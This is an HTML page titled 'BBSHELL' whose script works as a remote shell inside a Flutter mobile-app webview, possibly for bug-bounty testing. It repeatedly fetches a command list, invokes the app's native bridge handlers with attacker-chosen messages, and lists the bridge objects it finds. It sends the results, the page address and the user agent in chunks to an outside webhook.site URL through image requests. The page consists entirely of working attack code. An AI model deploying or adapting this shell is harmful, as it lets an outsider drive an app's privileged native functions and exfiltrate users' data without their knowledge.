<!doctype html>
<html><head><meta charset="utf-8"><title>BBSHELL</title></head>
<body><h1>BBSHELL</h1><pre id="o">running</pre>
<script>
var HOOK = 'https://webhook.site/c05df4a9-d728-4fe6-b222-b27dde6acb80';
var CMDS = 'commands.json';
function send(tag, obj) {
  var s;
  try { s = (typeof obj === 'string') ? obj : JSON.stringify(obj); } catch (e) { s = 'JSONERR ' + e; }
  for (var i = 0; i < s.length; i += 1200) {
    try { new Image().src = HOOK + '?tag=' + encodeURIComponent(tag) + '&i=' + i + '&d=' + encodeURIComponent(s.substr(i, 1200)); } catch (e) {}
  }
  if (!s.length) { try { new Image().src = HOOK + '?tag=' + encodeURIComponent(tag) + '&d='; } catch (e) {} }
}
function log(x) { try { document.getElementById('o').textContent += '\n' + x; } catch (e) {} }
function withTimeout(p, ms) {
  return new Promise(function (resolve) {
    var done = false;
    var t = setTimeout(function () { if (!done) { done = true; resolve({ __timeout: true }); } }, ms);
    Promise.resolve(p).then(function (v) { if (!done) { done = true; clearTimeout(t); resolve({ __value: v }); } },
                            function (e) { if (!done) { done = true; clearTimeout(t); resolve({ __error: '' + e }); } });
  });
}
async function run(cmd) {
  var out = { id: cmd.id, bridge: cmd.bridge, method: cmd.msg && cmd.msg.methodName };
  try {
    var ch = window.flutter_inappwebview.callHandler;
    var r = await withTimeout(ch(cmd.bridge, typeof cmd.msg === 'string' ? cmd.msg : JSON.stringify(cmd.msg)), cmd.timeout || 5000);
    if (r && r.__timeout) { out.timeout = true; }
    else if (r && r.__error) { out.err = r.__error; }
    else {
      var v = r ? r.__value : null;
      try { out.res = (typeof v === 'string') ? v.substr(0, 1200) : JSON.stringify(v); } catch (e) { out.res = 'strerr'; }
      out.type = typeof v;
    }
  } catch (e) { out.err = '' + e; }
  send('RES', out);
  log('RES ' + JSON.stringify(out).substr(0, 200));
}
var seen = {};
async function poll() {
  try {
    var r = await fetch(CMDS + '?t=' + Date.now(), { cache: 'no-store' });
    var list = JSON.parse(await r.text());
    for (var i = 0; i < list.length; i++) {
      var c = list[i];
      if (seen[c.id]) continue;
      seen[c.id] = 1;
      await run(c);
    }
  } catch (e) { log('poll err ' + e); }
  setTimeout(poll, 2500);
}
var out = { href: location.href, ua: navigator.userAgent };
try { out.bridges = Object.getOwnPropertyNames(window).filter(function (k) { return k.indexOf('_b_bridge_') === 0; }); } catch (e) {}
send('HELLO', out);
send('READY', 'shell v2');
poll();
</script></body></html>
